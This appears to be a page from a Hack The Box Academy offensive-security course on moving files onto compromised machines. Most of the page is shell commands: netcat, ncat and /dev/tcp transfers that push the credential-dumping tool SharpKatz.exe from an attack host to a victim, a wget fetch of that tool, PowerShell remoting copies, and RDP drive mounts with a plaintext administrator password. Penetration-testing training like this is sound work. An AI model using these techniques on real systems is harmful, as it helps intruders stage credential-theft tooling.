<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/24/section/161
// Platform Version: V1
// Module ID: 24
// Module Name: File Transfers
// Module Difficulty: Medium
// Section ID: 161
// Section Title: Miscellaneous File Transfer Methods
// Page Title: File Transfers
// Page Number: 05
-->

# Miscellaneous File Transfer Methods

**Module Name:** File Transfers **Page Number:** 05

#### FILE TRANSFERS

# Miscellaneous File Transfer Methods

## Netcat

## File Transfer with Netcat and Ncat

#### NetCat - Compromised Machine - Listening on Port 8000

``` shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

#### Ncat - Compromised Machine - Listening on Port 8000

``` shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

#### Netcat - Attack Host - Sending File to Compromised machine

``` shell-session
[!bash!]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
[!bash!]$ # Example using Original Netcat
[!bash!]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

#### Ncat - Attack Host - Sending File to Compromised machine

``` shell-session
[!bash!]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
[!bash!]$ # Example using Ncat
[!bash!]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

#### Attack Host - Sending File as Input to Netcat

``` shell-session
[!bash!]$ # Example using Original Netcat
[!bash!]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

``` shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

#### Attack Host - Sending File as Input to Ncat

``` shell-session
[!bash!]$ # Example using Ncat
[!bash!]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

``` shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

#### NetCat - Sending File as Input to Netcat

``` shell-session
[!bash!]$ # Example using Original Netcat
[!bash!]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Netcat

``` shell-session
[!bash!]$ # Example using Ncat
[!bash!]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

``` shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## PowerShell Session File Transfer

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

``` powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

``` powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

#### Create a PowerShell Remoting Session to DATABASE01

``` powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

``` powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

``` powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

#### Mounting a Linux Folder Using rdesktop

``` shell-session
[!bash!]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

``` shell-session
[!bash!]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

![https://academy.hackthebox.com/storage/modules/24/tsclient.jpg](https://academy.hackthebox.com/storage/modules/24/tsclient.jpg)

![https://academy.hackthebox.com/storage/modules/24/rdp.png](https://academy.hackthebox.com/storage/modules/24/rdp.png)

## Practice Makes Perfect

# 

# 

#### Optional Exercises

####